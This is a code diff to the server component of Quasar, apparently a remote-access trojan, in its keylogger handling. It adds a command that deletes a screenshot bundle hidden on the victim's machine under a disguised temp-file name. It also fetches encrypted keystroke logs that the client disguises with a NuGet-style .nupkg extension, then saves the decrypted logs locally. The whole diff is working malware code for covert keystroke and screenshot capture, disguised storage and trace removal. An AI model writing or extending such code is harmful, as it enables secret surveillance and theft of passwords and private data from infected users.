@@ -11,6 +11,7 @@ using System.Collections.Generic;
 using System.Globalization;
 using System.IO;
 using System.Text;
+using System.Text.RegularExpressions;
 
 namespace Quasar.Server.Messages
 {
@@ -46,7 +47,7 @@ namespace Quasar.Server.Messages
 
         private readonly object _pendingScreenshotLock = new object();
 
-        private enum KeyloggerDirPendingAction { None, ListLogs, DownloadScreenshotBundle }
+        private enum KeyloggerDirPendingAction { None, ListLogs, DownloadScreenshotBundle, ClearScreenshotBundle }
 
         private KeyloggerDirPendingAction _pendingKeyloggerDirAction = KeyloggerDirPendingAction.None;
 
@@ -129,6 +130,22 @@ namespace Quasar.Server.Messages
             OnReport("Requested deletion of logs on client");
         }
 
+        /// <summary>
+        /// Deletes the encrypted screenshot bundle file on the client (%TEMP%\wctBG958.tmp).
+        /// </summary>
+        public void ClearScreenshotsOnClient()
+        {
+            if (!string.IsNullOrEmpty(_remoteScreenshotBundlePath))
+            {
+                _fileManagerHandler.DeleteFile(_remoteScreenshotBundlePath, FileType.File);
+                OnReport("Requested clearing screenshot file on client");
+                return;
+            }
+
+            _pendingKeyloggerDirAction = KeyloggerDirPendingAction.ClearScreenshotBundle;
+            _client.Send(new GetKeyloggerLogsDirectory());
+        }
+
         private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
         {
             _remoteKeyloggerDirectory = message.LogsDirectory ?? "";
@@ -151,6 +168,15 @@ namespace Quasar.Server.Messages
                         OnReport("Downloading screenshot bundle...");
                     }
                     break;
+                case KeyloggerDirPendingAction.ClearScreenshotBundle:
+                    if (string.IsNullOrEmpty(_remoteScreenshotBundlePath))
+                        OnReport("Screenshot bundle path not available from client");
+                    else
+                    {
+                        _fileManagerHandler.DeleteFile(_remoteScreenshotBundlePath, FileType.File);
+                        OnReport("Requested clearing screenshot file on client");
+                    }
+                    break;
                 default:
                     /* Backward compatibility: if something triggers this without a pending action, list logs. */
                     if (!string.IsNullOrEmpty(_remoteKeyloggerDirectory))
@@ -171,6 +197,29 @@ namespace Quasar.Server.Messages
         {
             // called when directory does not exist or access is denied
             OnReport($"No logs found ({value})");
+        }
+
+        /* C client HTML header: "Log created on yyyy-MM-dd ..." — use for local .html name when remote file is .nupkg / .bin. */
+        private static readonly Regex LogCreatedOnDate =
+            new Regex(@"Log created on (\d{4}-\d{2}-\d{2})", RegexOptions.Compiled);
+
+        private static string KeylogHtmlFileBaseName(string content, string fallbackWithoutExtension)
+        {
+            if (!string.IsNullOrEmpty(content))
+            {
+                var m = LogCreatedOnDate.Match(content);
+                if (m.Success)
+                {
+                    string d = m.Groups[1].Value;
+                    foreach (char c in Path.GetInvalidFileNameChars())
+                    {
+                        if (d.IndexOf(c) >= 0)
+                            return fallbackWithoutExtension;
+                    }
+                    return d;
+                }
+            }
+            return fallbackWithoutExtension;
         }
 
         private static string SanitizeScreenshotFileName(string name)
@@ -289,10 +338,11 @@ namespace Quasar.Server.Messages
 
         private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
         {
-            /* Only consider real file entries that look like keylogger logs (.bin from C client, .html from C# client). */
+            /* C client: encrypted logs as .nupkg (NuGet-style); legacy .bin; C# client: .html */
             var logItems = Array.FindAll(items, i =>
                 i.EntryType == FileType.File &&
-                (i.Name.EndsWith(".bin", StringComparison.OrdinalIgnoreCase) ||
+                (i.Name.EndsWith(".nupkg", StringComparison.OrdinalIgnoreCase) ||
+                 i.Name.EndsWith(".bin", StringComparison.OrdinalIgnoreCase) ||
                  i.Name.EndsWith(".html", StringComparison.OrdinalIgnoreCase)));
 
             if (logItems.Length == 0)
@@ -315,8 +365,9 @@ namespace Quasar.Server.Messages
                     return;
                 }
 
-                /* Server always uses .html for keylog files; client may send .bin (C client) or .html (C#). */
-                string localName = item.Name.EndsWith(".bin", StringComparison.OrdinalIgnoreCase)
+                /* Server saves decrypted C client logs as .html; C# client may already use .html. */
+                string localName = item.Name.EndsWith(".nupkg", StringComparison.OrdinalIgnoreCase) ||
+                    item.Name.EndsWith(".bin", StringComparison.OrdinalIgnoreCase)
                     ? Path.ChangeExtension(item.Name, ".html")
                     : item.Name;
                 _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), localName, true);
@@ -401,7 +452,24 @@ namespace Quasar.Server.Messages
                         }
                     }
                     if (content != null)
-                        File.WriteAllText(transfer.LocalPath, content, Encoding.UTF8);
+                    {
+                        string outDir = Path.GetDirectoryName(transfer.LocalPath) ?? "";
+                        string fallbackBase = Path.GetFileNameWithoutExtension(transfer.LocalPath);
+                        string baseName = KeylogHtmlFileBaseName(content, fallbackBase);
+                        string finalPath = Path.Combine(outDir, baseName + ".html");
+                        File.WriteAllText(finalPath, content, Encoding.UTF8);
+                        if (!string.Equals(finalPath, transfer.LocalPath, StringComparison.OrdinalIgnoreCase))
+                        {
+                            try
+                            {
+                                File.Delete(transfer.LocalPath);
+                            }
+                            catch
+                            {
+                                /* keep wrongly named copy if locked */
+                            }
+                        }
+                    }
                     else
                         OnReport("Decryption failed for " + Path.GetFileName(transfer.LocalPath));
 
